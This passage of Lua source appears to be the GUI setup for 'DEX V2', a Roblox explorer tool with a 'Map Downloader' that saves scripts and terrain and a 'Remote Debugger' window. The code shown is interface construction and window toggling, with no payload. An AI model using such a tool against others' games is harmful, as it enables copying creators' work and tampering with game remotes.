		NewGuiPart100.Position = UDim2.new(0, 0, 0, 40)
		NewGuiPart100.Size = UDim2.new(1, -32, 0, 20)

		NewGuiPart101.Name = "Entry"
		NewGuiPart101.Parent = NewGuiPart86
		NewGuiPart101.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart101.BackgroundTransparency = 1
		NewGuiPart101.Size = UDim2.new(0, 100, 1, 0)
		NewGuiPart101.Visible = false

		NewGuiPart102.Name = "Button"
		NewGuiPart102.Parent = NewGuiPart101
		NewGuiPart102.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart102.BackgroundTransparency = 0.60000002384186
		NewGuiPart102.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart102.ClipsDescendants = true
		NewGuiPart102.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart102.ZIndex = 4
		NewGuiPart102.Font = Enum.Font.SourceSans
		NewGuiPart102.FontSize = Enum.FontSize.Size12
		NewGuiPart102.Text = ""
		NewGuiPart102.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart103.Name = "Close"
		NewGuiPart103.Parent = NewGuiPart101
		NewGuiPart103.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart103.BackgroundTransparency = 1
		NewGuiPart103.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart103.Position = UDim2.new(1, -20, 0, 0)
		NewGuiPart103.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart103.ZIndex = 4
		NewGuiPart103.Font = Enum.Font.SourceSans
		NewGuiPart103.FontSize = Enum.FontSize.Size14
		NewGuiPart103.Text = "X"

		NewGuiPart104.Name = "Close"
		NewGuiPart104.Parent = NewGuiPart82
		NewGuiPart104.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart104.BackgroundTransparency = 1
		NewGuiPart104.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart104.Position = UDim2.new(1, -20, 0, 0)
		NewGuiPart104.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart104.ZIndex = 5
		NewGuiPart104.Font = Enum.Font.SourceSans
		NewGuiPart104.FontSize = Enum.FontSize.Size14
		NewGuiPart104.Text = "X"

		NewGuiPart105.Name = "IntroFrame"
		NewGuiPart105.Parent = NewGuiPart1
		NewGuiPart105.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
		NewGuiPart105.BorderSizePixel = 0
		NewGuiPart105.Position = UDim2.new(1, 30, 0, 0)
		NewGuiPart105.Size = UDim2.new(0, 300, 1, 0)
		NewGuiPart105.ZIndex = 2

		NewGuiPart106.Name = "Main"
		NewGuiPart106.Parent = NewGuiPart105
		NewGuiPart106.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
		NewGuiPart106.BorderSizePixel = 0
		NewGuiPart106.Position = UDim2.new(0, -30, 0, 0)
		NewGuiPart106.Size = UDim2.new(0, 30, 0, 90)
		NewGuiPart106.ZIndex = 2

		NewGuiPart107.Name = "Title"
		NewGuiPart107.Parent = NewGuiPart105
		NewGuiPart107.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart107.BackgroundTransparency = 1
		NewGuiPart107.Position = UDim2.new(0, 100, 0, 150)
		NewGuiPart107.Size = UDim2.new(0, 100, 0, 60)
		NewGuiPart107.ZIndex = 2
		NewGuiPart107.Font = Enum.Font.SourceSansBold
		NewGuiPart107.FontSize = Enum.FontSize.Size60
		NewGuiPart107.Text = "DEX"
		NewGuiPart107.TextWrapped = true

		NewGuiPart108.Name = "Version"
		NewGuiPart108.Parent = NewGuiPart105
		NewGuiPart108.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart108.BackgroundTransparency = 1
		NewGuiPart108.Position = UDim2.new(0, 100, 0, 210)
		NewGuiPart108.Size = UDim2.new(0, 100, 0, 30)
		NewGuiPart108.ZIndex = 2
		NewGuiPart108.Font = Enum.Font.SourceSansBold
		NewGuiPart108.FontSize = Enum.FontSize.Size28
		NewGuiPart108.Text = "V2.0.0"
		NewGuiPart108.TextWrapped = true

		NewGuiPart109.Name = "Creator"
		NewGuiPart109.Parent = NewGuiPart105
		NewGuiPart109.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart109.BackgroundTransparency = 1
		NewGuiPart109.Position = UDim2.new(0, 80, 0, 300)
		NewGuiPart109.Size = UDim2.new(0, 140, 0, 30)
		NewGuiPart109.ZIndex = 2
		NewGuiPart109.Font = Enum.Font.SourceSansBold
		NewGuiPart109.FontSize = Enum.FontSize.Size28
		NewGuiPart109.Text = "Raspberry Pi , Script Made By Advancedev"
		NewGuiPart109.TextWrapped = true

		NewGuiPart110.Name = "Slant"
		NewGuiPart110.Parent = NewGuiPart105
		NewGuiPart110.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart110.BackgroundTransparency = 1
		NewGuiPart110.Position = UDim2.new(0, -30, 0, 90)
		NewGuiPart110.Rotation = 180
		NewGuiPart110.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart110.ZIndex = 2
		NewGuiPart110.Image = "rbxassetid://474172996"
		NewGuiPart110.ImageColor3 = Color3.new(0.960784, 0.960784, 0.960784)

		NewGuiPart111.Name = "SaveMapWindow"
		NewGuiPart111.Parent = NewGuiPart1
		NewGuiPart111.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart111.BackgroundTransparency = 0.10000000149012
		NewGuiPart111.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart111.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart111.Size = UDim2.new(0, 300, 1, 0)

		NewGuiPart112.Name = "Header"
		NewGuiPart112.Parent = NewGuiPart111
		NewGuiPart112.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart112.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart112.Size = UDim2.new(1, 0, 0, 17)

		NewGuiPart113.Parent = NewGuiPart112
		NewGuiPart113.BackgroundTransparency = 1
		NewGuiPart113.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart113.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart113.Font = Enum.Font.SourceSans
		NewGuiPart113.FontSize = Enum.FontSize.Size14
		NewGuiPart113.Text = "Map Downloader"
		NewGuiPart113.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart113.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart114.Name = "MapSettings"
		NewGuiPart114.Parent = NewGuiPart111
		NewGuiPart114.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart114.BackgroundTransparency = 1
		NewGuiPart114.Position = UDim2.new(0, 0, 0, 200)
		NewGuiPart114.Size = UDim2.new(1, 0, 0, 240)

		NewGuiPart115.Name = "Terrain"
		NewGuiPart115.Parent = NewGuiPart114
		NewGuiPart115.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart115.BackgroundTransparency = 1
		NewGuiPart115.Position = UDim2.new(0, 0, 0, 60)
		NewGuiPart115.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart116.Name = "SName"
		NewGuiPart116.Parent = NewGuiPart115
		NewGuiPart116.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart116.BackgroundTransparency = 1
		NewGuiPart116.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart116.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart116.Font = Enum.Font.SourceSans
		NewGuiPart116.FontSize = Enum.FontSize.Size18
		NewGuiPart116.Text = "Save Terrain"
		NewGuiPart116.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart117.Name = "Status"
		NewGuiPart117.Parent = NewGuiPart115
		NewGuiPart117.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart117.BackgroundTransparency = 1
		NewGuiPart117.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart117.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart117.Font = Enum.Font.SourceSans
		NewGuiPart117.FontSize = Enum.FontSize.Size18
		NewGuiPart117.Text = "Off"
		NewGuiPart117.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart118.Name = "Change"
		NewGuiPart118.Parent = NewGuiPart115
		NewGuiPart118.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart118.BorderSizePixel = 0
		NewGuiPart118.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart118.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart118.Font = Enum.Font.SourceSans
		NewGuiPart118.FontSize = Enum.FontSize.Size14
		NewGuiPart118.Text = ""

		NewGuiPart119.Name = "OnBar"
		NewGuiPart119.Parent = NewGuiPart118
		NewGuiPart119.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart119.BorderSizePixel = 0
		NewGuiPart119.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart119.Font = Enum.Font.SourceSans
		NewGuiPart119.FontSize = Enum.FontSize.Size14
		NewGuiPart119.Text = ""

		NewGuiPart120.Name = "Bar"
		NewGuiPart120.Parent = NewGuiPart118
		NewGuiPart120.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart120.BorderSizePixel = 0
		NewGuiPart120.ClipsDescendants = true
		NewGuiPart120.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart120.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart120.Font = Enum.Font.SourceSans
		NewGuiPart120.FontSize = Enum.FontSize.Size14
		NewGuiPart120.Text = ""

		NewGuiPart121.Name = "Lighting"
		NewGuiPart121.Parent = NewGuiPart114
		NewGuiPart121.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart121.BackgroundTransparency = 1
		NewGuiPart121.Position = UDim2.new(0, 0, 0, 120)
		NewGuiPart121.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart122.Name = "SName"
		NewGuiPart122.Parent = NewGuiPart121
		NewGuiPart122.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart122.BackgroundTransparency = 1
		NewGuiPart122.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart122.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart122.Font = Enum.Font.SourceSans
		NewGuiPart122.FontSize = Enum.FontSize.Size18
		NewGuiPart122.Text = "Lighting Properties"
		NewGuiPart122.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart123.Name = "Status"
		NewGuiPart123.Parent = NewGuiPart121
		NewGuiPart123.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart123.BackgroundTransparency = 1
		NewGuiPart123.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart123.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart123.Font = Enum.Font.SourceSans
		NewGuiPart123.FontSize = Enum.FontSize.Size18
		NewGuiPart123.Text = "Off"
		NewGuiPart123.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart124.Name = "Change"
		NewGuiPart124.Parent = NewGuiPart121
		NewGuiPart124.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart124.BorderSizePixel = 0
		NewGuiPart124.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart124.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart124.Font = Enum.Font.SourceSans
		NewGuiPart124.FontSize = Enum.FontSize.Size14
		NewGuiPart124.Text = ""

		NewGuiPart125.Name = "OnBar"
		NewGuiPart125.Parent = NewGuiPart124
		NewGuiPart125.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart125.BorderSizePixel = 0
		NewGuiPart125.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart125.Font = Enum.Font.SourceSans
		NewGuiPart125.FontSize = Enum.FontSize.Size14
		NewGuiPart125.Text = ""

		NewGuiPart126.Name = "Bar"
		NewGuiPart126.Parent = NewGuiPart124
		NewGuiPart126.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart126.BorderSizePixel = 0
		NewGuiPart126.ClipsDescendants = true
		NewGuiPart126.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart126.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart126.Font = Enum.Font.SourceSans
		NewGuiPart126.FontSize = Enum.FontSize.Size14
		NewGuiPart126.Text = ""

		NewGuiPart127.Name = "CameraInstances"
		NewGuiPart127.Parent = NewGuiPart114
		NewGuiPart127.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart127.BackgroundTransparency = 1
		NewGuiPart127.Position = UDim2.new(0, 0, 0, 180)
		NewGuiPart127.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart128.Name = "SName"
		NewGuiPart128.Parent = NewGuiPart127
		NewGuiPart128.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart128.BackgroundTransparency = 1
		NewGuiPart128.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart128.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart128.Font = Enum.Font.SourceSans
		NewGuiPart128.FontSize = Enum.FontSize.Size18
		NewGuiPart128.Text = "Camera Instances"
		NewGuiPart128.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart129.Name = "Status"
		NewGuiPart129.Parent = NewGuiPart127
		NewGuiPart129.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart129.BackgroundTransparency = 1
		NewGuiPart129.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart129.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart129.Font = Enum.Font.SourceSans
		NewGuiPart129.FontSize = Enum.FontSize.Size18
		NewGuiPart129.Text = "Off"
		NewGuiPart129.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart130.Name = "Change"
		NewGuiPart130.Parent = NewGuiPart127
		NewGuiPart130.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart130.BorderSizePixel = 0
		NewGuiPart130.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart130.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart130.Font = Enum.Font.SourceSans
		NewGuiPart130.FontSize = Enum.FontSize.Size14
		NewGuiPart130.Text = ""

		NewGuiPart131.Name = "OnBar"
		NewGuiPart131.Parent = NewGuiPart130
		NewGuiPart131.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart131.BorderSizePixel = 0
		NewGuiPart131.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart131.Font = Enum.Font.SourceSans
		NewGuiPart131.FontSize = Enum.FontSize.Size14
		NewGuiPart131.Text = ""

		NewGuiPart132.Name = "Bar"
		NewGuiPart132.Parent = NewGuiPart130
		NewGuiPart132.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart132.BorderSizePixel = 0
		NewGuiPart132.ClipsDescendants = true
		NewGuiPart132.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart132.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart132.Font = Enum.Font.SourceSans
		NewGuiPart132.FontSize = Enum.FontSize.Size14
		NewGuiPart132.Text = ""

		NewGuiPart133.Name = "Scripts"
		NewGuiPart133.Parent = NewGuiPart114
		NewGuiPart133.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart133.BackgroundTransparency = 1
		NewGuiPart133.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart134.Name = "SName"
		NewGuiPart134.Parent = NewGuiPart133
		NewGuiPart134.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart134.BackgroundTransparency = 1
		NewGuiPart134.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart134.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart134.Font = Enum.Font.SourceSans
		NewGuiPart134.FontSize = Enum.FontSize.Size18
		NewGuiPart134.Text = "Save Scripts"
		NewGuiPart134.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart135.Name = "Status"
		NewGuiPart135.Parent = NewGuiPart133
		NewGuiPart135.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart135.BackgroundTransparency = 1
		NewGuiPart135.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart135.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart135.Font = Enum.Font.SourceSans
		NewGuiPart135.FontSize = Enum.FontSize.Size18
		NewGuiPart135.Text = "Off"
		NewGuiPart135.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart136.Name = "Change"
		NewGuiPart136.Parent = NewGuiPart133
		NewGuiPart136.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart136.BorderSizePixel = 0
		NewGuiPart136.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart136.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart136.Font = Enum.Font.SourceSans
		NewGuiPart136.FontSize = Enum.FontSize.Size14
		NewGuiPart136.Text = ""

		NewGuiPart137.Name = "OnBar"
		NewGuiPart137.Parent = NewGuiPart136
		NewGuiPart137.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart137.BorderSizePixel = 0
		NewGuiPart137.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart137.Font = Enum.Font.SourceSans
		NewGuiPart137.FontSize = Enum.FontSize.Size14
		NewGuiPart137.Text = ""

		NewGuiPart138.Name = "Bar"
		NewGuiPart138.Parent = NewGuiPart136
		NewGuiPart138.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart138.BorderSizePixel = 0
		NewGuiPart138.ClipsDescendants = true
		NewGuiPart138.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart138.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart138.Font = Enum.Font.SourceSans
		NewGuiPart138.FontSize = Enum.FontSize.Size14
		NewGuiPart138.Text = ""

		NewGuiPart139.Name = "ToSave"
		NewGuiPart139.Parent = NewGuiPart111
		NewGuiPart139.BackgroundTransparency = 1
		NewGuiPart139.Position = UDim2.new(0, 0, 0, 17)
		NewGuiPart139.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart139.Font = Enum.Font.SourceSans
		NewGuiPart139.FontSize = Enum.FontSize.Size18
		NewGuiPart139.Text = "To Save"
		NewGuiPart139.TextColor3 = Color3.new(0, 0, 0)

		NewGuiPart140.Name = "CopyList"
		NewGuiPart140.Parent = NewGuiPart111
		NewGuiPart140.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart140.BackgroundTransparency = 0.80000001192093
		NewGuiPart140.Position = UDim2.new(0, 0, 0, 37)
		NewGuiPart140.Size = UDim2.new(1, 0, 0, 163)

		NewGuiPart141.Name = "Bottom"
		NewGuiPart141.Parent = NewGuiPart111
		NewGuiPart141.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart141.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart141.Position = UDim2.new(0, 0, 1, -50)
		NewGuiPart141.Size = UDim2.new(1, 0, 0, 50)

		NewGuiPart142.Parent = NewGuiPart141
		NewGuiPart142.BackgroundTransparency = 1
		NewGuiPart142.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart142.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart142.Font = Enum.Font.SourceSans
		NewGuiPart142.FontSize = Enum.FontSize.Size14
		NewGuiPart142.Text = "After the map saves, open a new place on studio, then right click Lighting and \"Insert from file...\", then select your file and run the unpacker script inside the folder."
		NewGuiPart142.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart142.TextWrapped = true
		NewGuiPart142.TextXAlignment = Enum.TextXAlignment.Left
		NewGuiPart142.TextYAlignment = Enum.TextYAlignment.Top

		NewGuiPart143.Name = "Save"
		NewGuiPart143.Parent = NewGuiPart111
		NewGuiPart143.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
		NewGuiPart143.BackgroundTransparency = 0.80000001192093
		NewGuiPart143.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart143.Position = UDim2.new(0, 0, 1, -80)
		NewGuiPart143.Size = UDim2.new(1, 0, 0, 30)
		NewGuiPart143.Font = Enum.Font.SourceSans
		NewGuiPart143.FontSize = Enum.FontSize.Size18
		NewGuiPart143.Text = "Save"

		NewGuiPart144.Name = "FileName"
		NewGuiPart144.Parent = NewGuiPart111
		NewGuiPart144.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
		NewGuiPart144.BackgroundTransparency = 0.60000002384186
		NewGuiPart144.Position = UDim2.new(0, 0, 1, -105)
		NewGuiPart144.Size = UDim2.new(1, 0, 0, 25)
		NewGuiPart144.Font = Enum.Font.SourceSans
		NewGuiPart144.FontSize = Enum.FontSize.Size18
		NewGuiPart144.Text = "PlaceName"
		NewGuiPart144.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart145.Name = "Entry"
		NewGuiPart145.Parent = NewGuiPart111
		NewGuiPart145.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart145.BackgroundTransparency = 1
		NewGuiPart145.Size = UDim2.new(1, 0, 0, 22)
		NewGuiPart145.Visible = false

		NewGuiPart146.Name = "Change"
		NewGuiPart146.Parent = NewGuiPart145
		NewGuiPart146.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart146.BackgroundTransparency = 0.60000002384186
		NewGuiPart146.Position = UDim2.new(0, 10, 0, 1)
		NewGuiPart146.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart146.ZIndex = 2
		NewGuiPart146.Font = Enum.Font.SourceSans
		NewGuiPart146.FontSize = Enum.FontSize.Size18
		NewGuiPart146.Text = ""
		NewGuiPart146.TextColor3 = Color3.new(1, 1, 1)

		NewGuiPart147.Name = "enabled"
		NewGuiPart147.Parent = NewGuiPart146
		NewGuiPart147.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
		NewGuiPart147.BackgroundTransparency = 0.40000000596046
		NewGuiPart147.BorderSizePixel = 0
		NewGuiPart147.Position = UDim2.new(0, 3, 0, 3)
		NewGuiPart147.Size = UDim2.new(0, 14, 0, 14)
		NewGuiPart147.Font = Enum.Font.SourceSans
		NewGuiPart147.FontSize = Enum.FontSize.Size14
		NewGuiPart147.Text = ""

		NewGuiPart148.Name = "Info"
		NewGuiPart148.Parent = NewGuiPart145
		NewGuiPart148.BackgroundTransparency = 1
		NewGuiPart148.Position = UDim2.new(0, 40, 0, 0)
		NewGuiPart148.Size = UDim2.new(1, -40, 0, 22)
		NewGuiPart148.Font = Enum.Font.SourceSans
		NewGuiPart148.FontSize = Enum.FontSize.Size18
		NewGuiPart148.Text = "Workspace"
		NewGuiPart148.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart148.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart149.Name = "RemoteDebugWindow"
		NewGuiPart149.Parent = NewGuiPart1
		NewGuiPart149.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart149.BackgroundTransparency = 0.10000000149012
		NewGuiPart149.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart149.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart149.Size = UDim2.new(0, 300, 1, 0)

		NewGuiPart161.Name = "GetSetting"
		NewGuiPart161.Parent = NewGuiPart149
		NewGuiPart161.Archivable = true

		NewGuiPart150.Name = "Header"
		NewGuiPart150.Parent = NewGuiPart149
		NewGuiPart150.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart150.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart150.Size = UDim2.new(1, 0, 0, 17)

		NewGuiPart151.Parent = NewGuiPart150
		NewGuiPart151.BackgroundTransparency = 1
		NewGuiPart151.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart151.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart151.Font = Enum.Font.SourceSans
		NewGuiPart151.FontSize = Enum.FontSize.Size14
		NewGuiPart151.Text = "Remote Debugger"
		NewGuiPart151.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart151.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart152.Name = "Desc"
		NewGuiPart152.Parent = NewGuiPart149
		NewGuiPart152.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart152.BackgroundTransparency = 1
		NewGuiPart152.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart152.Size = UDim2.new(1, 0, 0, 40)
		NewGuiPart152.Font = Enum.Font.SourceSans
		NewGuiPart152.FontSize = Enum.FontSize.Size32
		NewGuiPart152.Text = "Have fun with remotes"
		NewGuiPart152.TextWrapped = true
		return NewGuiPart1
	end
	local D_E_X = CreateGui()
	D_E_X.Parent = game.Players.LocalPlayer.PlayerGui
	spawn(function()
		local Gui = D_E_X


		local IntroFrame = Gui:WaitForChild("IntroFrame")

		local SideMenu = Gui:WaitForChild("SideMenu")
		local OpenToggleButton = Gui:WaitForChild("Toggle")
		local CloseToggleButton = SideMenu:WaitForChild("Toggle")
		local OpenScriptEditorButton = SideMenu:WaitForChild("OpenScriptEditor")

		local ScriptEditor = Gui:WaitForChild("ScriptEditor")

		local SlideOut = SideMenu:WaitForChild("SlideOut")
		local SlideFrame = SlideOut:WaitForChild("SlideFrame")
		local Slant = SideMenu:WaitForChild("Slant")

		local ExplorerButton = SlideFrame:WaitForChild("Explorer")
		local SettingsButton = SlideFrame:WaitForChild("Settings")

		local SelectionBox = Instance.new("SelectionBox")
		SelectionBox.Parent = Gui

		local ExplorerPanel = Gui:WaitForChild("ExplorerPanel")
		local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
		local SaveMapWindow = Gui:WaitForChild("SaveMapWindow")
		local RemoteDebugWindow = Gui:WaitForChild("RemoteDebugWindow")

		local SettingsPanel = Gui:WaitForChild("SettingsPanel")
		local SettingsListener = SettingsPanel:WaitForChild("GetSetting")
		local SettingTemplate = SettingsPanel:WaitForChild("SettingTemplate")
		local SettingList = SettingsPanel:WaitForChild("SettingList")

		local SaveMapCopyList = SaveMapWindow:WaitForChild("CopyList")
		local SaveMapSettingFrame = SaveMapWindow:WaitForChild("MapSettings")
		local SaveMapName = SaveMapWindow:WaitForChild("FileName")
		local SaveMapButton = SaveMapWindow:WaitForChild("Save")
		local SaveMapCopyTemplate = SaveMapWindow:WaitForChild("Entry")
		local SaveMapSettings = {
			CopyWhat = {
				Workspace = true,
				Lighting = true,
				ReplicatedStorage = true,
				ReplicatedFirst = true,
				StarterPack = true,
				StarterGui = true,
				StarterPlayer = true
			},
			SaveScripts = true,
			SaveTerrain = true,
			LightingProperties = true,
			CameraInstances = true
		}

		local TotallyNotSelectionChanged = ExplorerPanel:WaitForChild("TotallyNotSelectionChanged")
		local TotallyNotGetSelection = ExplorerPanel:WaitForChild("TotallyNotGetSelection")
		local TotallyNotSetSelection = ExplorerPanel:WaitForChild("TotallyNotSetSelection")

		local Player = game:GetService("Players").LocalPlayer
		local Mouse = Player:GetMouse()

		local CurrentWindow = "Nothing c:"
		local Windows = {
			Explorer = {
				ExplorerPanel,
				PropertiesFrame
			},
			Settings = {SettingsPanel},
			SaveMap = {SaveMapWindow},
			Remotes = {RemoteDebugWindow}
		}

		function switchWindows(wName,over)
			if CurrentWindow == wName and not over then return end

			local count = 0

			for i,v in pairs(Windows) do
				count = 0
				if i ~= wName then
					for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
				end
			end

			count = 0

			if Windows[wName] then
				for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
			end

			if wName ~= "Nothing c:" then
				CurrentWindow = wName
				for i,v in pairs(SlideFrame:GetChildren()) do
					v.BackgroundTransparency = 1
					v.Icon.ImageColor3 = Color3.new(70/255, 70/255, 70/255)
				end
				if SlideFrame:FindFirstChild(wName) then
					SlideFrame[wName].BackgroundTransparency = 0.5
					SlideFrame[wName].Icon.ImageColor3 = Color3.new(0,0,0)
				end
			end
		end

		function toggleDex(on)
			if on then
				SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
				OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
				switchWindows(CurrentWindow,true)
			else
				SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
				OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
				switchWindows("Nothing c:")
			end
		end

		local Settings = {
			ClickSelect = false,
			SelBox = false,
			ClearProps = false,
			SelectUngrouped = true,
			SaveInstanceScripts = true
		}

		function ReturnSetting(set)
			if set == "ClearProps" then
				return Settings.ClearProps
			elseif set == "SelectUngrouped" then
				return Settings.SelectUngrouped
			end
		end

		OpenToggleButton.MouseButton1Up:connect(function()
			toggleDex(true)
		end)

		OpenScriptEditorButton.MouseButton1Up:connect(function()
			if OpenScriptEditorButton.Active then
				ScriptEditor.Visible = true
			end
		end)

		CloseToggleButton.MouseButton1Up:connect(function()
			if CloseToggleButton.Active then
				toggleDex(false)
			end
		end)

		for i,v in pairs(SlideFrame:GetChildren()) do
			v.MouseButton1Click:connect(function()
				switchWindows(v.Name)
			end)

			v.MouseEnter:connect(function()v.BackgroundTransparency = 0.5 end)
			v.MouseLeave:connect(function()if CurrentWindow~=v.Name then v.BackgroundTransparency = 1 end end)
		end


		function createSetting(name,interName,defaultOn)
			local newSetting = SettingTemplate:Clone()
			newSetting.Position = UDim2.new(0,0,0,#SettingList:GetChildren() * 60)
			newSetting.SName.Text = name

			local function toggle(on)
